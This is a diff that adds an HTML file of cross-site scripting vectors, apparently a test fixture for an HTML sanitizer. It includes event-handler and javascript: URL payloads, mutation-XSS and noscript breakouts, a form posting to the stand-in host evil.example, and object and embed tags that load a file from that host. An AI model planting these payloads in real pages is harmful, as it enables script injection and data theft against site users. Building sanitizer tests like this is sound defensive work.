@@ -1,0 +1,16 @@
+<p>Safe text <img src=x onerror="alert('img')"> after image.</p>
+<p><a href="javascript:alert(1)">js link</a> <a href=" JAVASCRIPT:alert(2)">spaced</a> <a href="java&#x09;script:alert(3)">tab</a> <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg0KTwvc2NyaXB0Pg==">data</a></p>
+<svg onload="alert(5)"><script>alert(6)</script><text>svg text</text></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(7)></style></mglyph></table></mtext></math>
+<noscript><p title="</noscript><img src=x onerror=alert(8)>"></p></noscript>
+<form action="https://evil.example"><input name="q" value="steal"><button formaction="javascript:alert(9)">Go</button></form>
+<iframe src="javascript:alert(10)"></iframe><iframe srcdoc="<script>alert(11)</script>"></iframe>
+<p style="background-image:url('javascript:alert(12)');width:expression(alert(13))">styled</p>
+<details open ontoggle="alert(14)"><summary>toggle</summary><p>inside</p></details>
+<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
+<p><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMTUpPjwvc3ZnPg==" alt="svg data"></p>
+<template><p>template content</p></template>
+<p><a href="https://ok.example/" onclick="alert(16)" onmouseover="alert(17)">ok link</a></p>
+<base href="javascript:alert(18)//"><p><a href="relative">relative</a></p>
+<video src="https://ok.example/v.mp4" onloadstart="alert(19)" poster="javascript:alert(20)"></video>
+<p>The end.</p>
